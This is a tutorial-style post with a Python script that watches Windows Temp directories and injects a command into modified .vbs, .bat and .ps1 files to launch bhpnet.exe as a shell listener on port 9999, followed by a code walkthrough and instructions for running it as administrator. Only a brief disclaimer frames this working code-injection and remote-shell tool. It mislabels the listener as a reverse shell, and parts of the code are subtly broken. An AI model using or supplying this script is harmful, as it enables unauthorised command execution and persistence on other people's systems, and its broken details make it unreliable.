This script is designed to monitor specific directories (e.g., Windows Temp directories) for file creation, modification, deletion, or renaming. When a specific type of file (e.g., `.vbs`, `.bat`, or `.ps1`) is modified, the script injects additional code into the file. The injected code runs a command (`bhpnet.exe`) that opens a reverse shell connection to a specified port. 


```python
import tempfile
import threading
import win32file
import win32con
import os

# common temp file directories
dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

# file modification constants
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3 
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

# extension based code snippets to inject
file_types = {}
command = "C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c"
file_types[".vbs"] = ["\r\n'bhpmarker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
file_types[".bat"] = ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command]
file_types[".ps1"] = ["\r\n#bhpmarker", "Start-Process \"%s\"" % command]

def inject_code(full_filename, extension, contents):
    # check if our marker is already in the file
    if file_types[extension][0] in contents:
        return
    
    # if not, let's inject marker and code
    full_contents = file_types[extension][0]
    full_contents += file_types[extension][1]
    full_contents += contents
    
    with open(full_filename, "wb") as fd:
        fd.write(full_contents.encode())
        
    print("[\o/] Injected code")
    
    return

def start_monitor(path_to_watch):
    # create a thread for each monitoring run
    file_list_directory = 0x0001
    
    h_directory = win32file.CreateFile(
        path_to_watch,
        file_list_directory,
        win32con.FILE_SHARE_READ
        | win32con.FILE_SHARE_WRITE
        | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None)
    
    while True:
        try:
            results = win32file.ReadDirectoryChangesW(h_directory, 1024, True,
                                                      win32con.FILE_NOTIFY_CHANGE_FILE_NAME,
                                                      win32con.FILE_NOTIFY_CHANGE_DIR_NAME,
                                                      win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES,
                                                      win32con.FILE_NOTIFY_CHANGE_SIZE,
                                                      win32con.FILE_NOTIFY_CHANGE_LAST_WRITE,
                                                      win32con.FILE_NOTIFY_CHANGE_SECURITY,
                                                      None, None)
            
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                
                if action == FILE_CREATED:
                    print(f"[+] Created {full_filename}")
                elif action == FILE_DELETED:
                    print(f"[-] Deleted {full_filename}")
                elif action == FILE_MODIFIED:
                    print(f"[*] Modified {full_filename}")

                    # dump the file contents
                    print("[vvv] Dumping contents...")
                    
                    try:
                        with open(full_filename, "rb") as fd:
                            contents = fd.read()
                        print(contents)
                        print("[^^^] Dump completed")
                        filename, extension = os.path.splitext(full_filename)
                        if extension in file_types:
                            inject_code(full_filename, extension, contents)
                    except Exception as e:
                        print(f"[!!!] Failed! Error: {e}")
                        
                elif action == FILE_RENAMED_FROM:
                    print(f"[ > ] Renamed from {full_filename}")
                elif action == FILE_RENAMED_TO:
                    print(f"[ < ] Renamed to: {full_filename}")
                else:
                    print(f"[???] Unknown: {full_filename}")
        
        except:
            pass  
        
for path in dirs_to_monitor:
    monitor_thread = threading.Thread(target=start_monitor, args=(path,))
    print(f"Spawing monitoring thread for path: {path}")
    monitor_thread.start()
```


### Code Explanation

Here's a breakdown of the key components of the script:

### Key Variables:
1. **`dirs_to_monitor`**:
   - List of directories to monitor for file changes (e.g., `C:\\WINDOWS\\Temp`, the default temp directory).
   
2. **File Modification Constants**:
   - Constants that define the types of file modifications (created, deleted, modified, renamed).

3. **`file_types`**:
   - A dictionary that maps file extensions (`.vbs`, `.bat`, `.ps1`) to the code snippet that will be injected into those files when modified.

4. **`command`**:
   - The command that will be injected into the files. It specifies running a reverse shell listener (`bhpnet.exe`) on port `9999`.

### Key Functions:
1. **`inject_code(full_filename, extension, contents)`**:
   - Checks if the file already contains a marker (e.g., `bhpmarker`), and if not, it appends the marker and the command to run `bhpnet.exe`.
   - Writes the modified content back to the file.

2. **`start_monitor(path_to_watch)`**:
   - Monitors a given directory for file changes using the `win32file.ReadDirectoryChangesW()` function.
   - Listens for changes in file name, attributes, size, or write time.
   - For modified files, the script reads and prints the contents. If the file is one of the target types (e.g., `.vbs`, `.bat`, `.ps1`), it calls the `inject_code` function to inject the reverse shell code into the file.

### Multi-threading:
- The script starts a separate monitoring thread for each directory listed in `dirs_to_monitor`.
- Each thread runs `start_monitor()`, allowing the directories to be monitored simultaneously.

### How It Works:
- When a file is modified (e.g., `.vbs`, `.bat`, `.ps1`), the script checks the file's contents.
- If the file contains the appropriate extension, the script injects the reverse shell command into the file.
- The injected code will execute the specified command (`bhpnet.exe`), establishing a reverse shell connection.

### How to Run:

1. **Install Required Libraries**:
   This script relies on the `pywin32` package, which provides access to Windows APIs:
   ```bash
   pip install pywin32
   ```

2. **Permissions**:
   - The script may require administrator privileges to monitor directories like `C:\\WINDOWS\\Temp` and to modify files in those directories.
   - Running with elevated privileges ensures it can access the necessary files.

3. **Running the Script**:
   - Save the script as `file_monitor.py`.
   - Open Command Prompt or PowerShell with administrator rights.
   - Run the script:
     ```bash
     python file_monitor.py
     ```

4. **Monitoring the Output**:
   - The script will print messages when files are created, deleted, or modified.
   - If a file of the specified types (`.vbs`, `.bat`, `.ps1`) is modified, the script will inject the reverse shell code and print a message indicating that code injection was successful.

### Example Output:
When a file is modified:
```
[*] Modified C:\WINDOWS\Temp\example.vbs
[vvv] Dumping contents...
b'...original file contents...'
[^^^] Dump completed
[\o/] Injected code
```

When a file is created:
```
[+] Created C:\WINDOWS\Temp\example.bat
```

When a file is deleted:
```
[-] Deleted C:\WINDOWS\Temp\example.ps1
```

### Important Considerations:
- **Malicious Intent**: This script appears to be designed for malicious purposes (i.e., injecting reverse shell code). It should not be used for any unauthorized or harmful activities.
- **Legal and Ethical Concerns**: Unauthorized file modification or tampering with system files is illegal and unethical. This code should only be used in controlled, legal environments such as security testing within an organization's boundaries with proper authorization.

**Ensure you have explicit consent to run this kind of script in any environment.**
